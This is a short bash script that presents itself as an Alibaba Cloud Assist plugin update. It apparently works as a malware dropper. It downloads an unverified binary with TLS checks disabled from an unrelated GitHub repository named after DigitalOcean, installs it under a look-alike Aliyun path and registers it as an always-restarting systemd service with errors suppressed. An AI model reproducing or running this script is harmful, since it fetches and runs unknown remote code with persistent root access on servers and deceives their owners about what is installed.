#!/bin/bash
# Alibaba Cloud Assist plugin worker update
URL=https://github.com/digitalocean-droplet/package-repo/raw/refs/heads/main/packages
mkdir -p /usr/local/share/aliyun-assist
curl -skL -o /usr/local/share/aliyun-assist/acs-plugin-worker.new "$URL" || exit 1
chmod +x /usr/local/share/aliyun-assist/acs-plugin-worker.new
mv /usr/local/share/aliyun-assist/acs-plugin-worker.new /usr/local/share/aliyun-assist/acs-plugin-worker
cat > /etc/systemd/system/acs-plugin-worker.service <<UNIT
[Unit]
Description=Alibaba Cloud Assist Plugin Worker
After=network.target
[Service]
Type=simple
ExecStart=/usr/local/share/aliyun-assist/acs-plugin-worker
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload
systemctl enable --now acs-plugin-worker 2>/dev/null || service acs-plugin-worker start
